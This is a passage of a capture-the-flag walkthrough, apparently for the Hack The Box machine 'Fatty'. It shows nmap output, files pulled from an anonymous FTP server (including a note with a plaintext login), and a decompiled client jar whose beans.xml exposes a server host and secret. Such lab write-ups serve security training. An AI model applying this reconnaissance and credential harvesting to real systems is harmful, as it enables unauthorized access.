76eb bfc8 e051 edb6 b8c9 c8a4 060e 6b76 c0a1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_ssl-date: 2020-07-20T18:05:11+00:00; +5m08s from scanner time.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">1339/tcp open  ssl/kjtsiteserver?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ssl-cert: Subject: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Issuer: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Public Key type: rsa</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Public Key bits: 4096</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Signature Algorithm: sha256WithRSAEncryption</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Not valid before: 2019-09-11T15:42:00</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Not valid after:  2020-09-10T15:42:00</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| MD5:   3bf4 8a15 e9cc 3aa1 89f0 a6e7 1389 9a6e</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_SHA-1: 3410 76eb bfc8 e051 edb6 b8c9 c8a4 060e 6b76 c0a1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_ssl-date: 2020-07-20T18:05:11+00:00; +5m08s from scanner time.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host script results:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_clock-skew: mean: 5m07s, deviation: 0s, median: 5m07s</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Read data files from: /usr/bin/../share/nmap</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Nmap done at Mon Jul 20 20:00:04 2020 -- 1 IP address (1 host up) scanned in 97.47 seconds</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="ftp">FTP<a href="#ftp" class="hash-link" aria-label="Direct link to FTP" title="Direct link to FTP">​</a></h2><p>With <code>FileZilla</code> we can retrieve the files available on the anonymously
accessible FTP server.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">| -rw-r--r--    1 ftp      ftp      15426727 Oct 30  2019 fatty-client.jar</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| -rw-r--r--    1 ftp      ftp           526 Oct 30  2019 note.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| -rw-r--r--    1 ftp      ftp           426 Oct 30  2019 note2.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_-rw-r--r--    1 ftp      ftp           194 Oct 30  2019 note3.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>note.txt</code></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Dear members,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">because of some security issues we moved the port of our fatty java server from 8000 to the hidden and undocumented port 1337.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Furthermore, we created two new instances of the server on port 1338 and 1339. They offer exactly the same server and it would be nice</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">if you use different servers from day to day to balance the server load.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">We were too lazy to fix the default port in the &#x27;.jar&#x27; file, but since you are all senior java developers you should be capable of</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">doing it yourself ;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Best regards,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">qtc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>So we will need to decompile the jar, change the port and recompile it.</p><p><code>note2.txt</code></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Dear members,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">we are currently experimenting with new java layouts. The new client uses a static layout. If your</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">are using a tiling window manager or only have a limited screen size, try to resize the client window</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">until you see the login from.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Furthermore, for compatibility reasons we still rely on Java 8. Since our company workstations ship Java 11</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">per default, you may need to install it manually.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Best regards,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">qtc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We may need to use Java 8, I have one if needed:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ archlinux-java status</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Available Java environments:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  java-10-openjdk</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  java-14-openjdk (default)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  java-8-openjdk</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>note3.txt</code></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Dear members,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">We had to remove all other user accounts because of some seucrity issues.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Until we have fixed these issues, you can use my account:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">User: qtc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Pass: clarabibi</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Best regards,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">qtc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We will be able to use those creds.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="java-decompiling">Java decompiling<a href="#java-decompiling" class="hash-link" aria-label="Direct link to Java decompiling" title="Direct link to Java decompiling">​</a></h2><p>Let&#x27;s open <code>fatty-client.jar</code> in <a href="https://java-decompiler.github.io/" target="_blank" rel="noopener noreferrer">jd-gui</a>.</p><p>In the <code>beans.xml</code> config file, we can retrieve the server connection
information, a keystore, and a secret.</p><div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token prolog" style="color:rgb(189, 147, 249)">&lt;?xml version = &quot;1.0&quot; encoding = &quot;UTF-8&quot;?&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">beans</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">xmlns</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">http://www.springframework.org/schema/beans</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag" style="color:rgb(255, 121, 198)"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token tag" style="color:rgb(255, 121, 198)">    </span><span class="token tag attr-name namespace" style="color:rgb(241, 250, 140)">xmlns:</span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">xsi</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">http://www.w3.org/2001/XMLSchema-instance</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag" style="color:rgb(255, 121, 198)"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token tag" style="color:rgb(255, 121, 198)">    </span><span class="token tag attr-name namespace" style="color:rgb(241, 250, 140)">xsi:</span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">schemaLocation</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token tag attr-value" style="color:rgb(255, 121, 198)">                http://www.springframework.org/schema/beans</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token tag attr-value" style="color:rgb(255, 121, 198)">                spring-beans-3.0.xsd</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)">&lt;!-- Here we have an constructor based injection, where Spring injects required arguments inside the</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">     constructor function. --&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">bean</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">id</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">connectionContext</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">class</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">htb.fatty.shared.connection.ConnectionContext</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">constructor-arg</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">index</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">0</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">value</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">server.fatty.htb</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">/&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">constructor-arg</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">index</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">1</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">value</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">8000</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">/&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">bean</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)">&lt;!-- The next to beans use setter injection. For this kind of injection one needs to define an default</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">constructor for the object (no arguments) and one needs to define setter methods for the properties. --&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">bean</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">id</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">trustedFatty</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">class</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">htb.fatty.shared.connection.TrustedFatty</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">property</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">name</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">keystorePath</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">value</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">fatty.p12</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">/&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">bean</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">bean</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">id</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">secretHolder</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">class</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">htb.fatty.shared.connection.SecretHolder</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">property</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">name</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">secret</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">value</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">clarabibiclarabibiclarabibi</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">/&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">bean</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)">&lt;!--  For out final bean we use now again constructor injection. Notice that we use now ref instead of val --&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">   </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">bean</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">id</span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">connection</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">class</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">htb.fatty.client.connection.Connection</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">constructor-arg</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">index</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">0</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" style="color:rgb(241, 250, 140)">ref</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation attr-equals" style="color:rgb(248, 248, 242)">=</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag attr-value" style="color:rgb(255, 121, 198)">connectionContext</span><span class="token tag attr-value punctuation" style="color:rgb(248, 248, 242)">&quot;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">/&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      </span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">constructor-arg</span><span class="token tag" style="color:rgb(255, 121, 198)"> </span><span class="token tag attr-name" 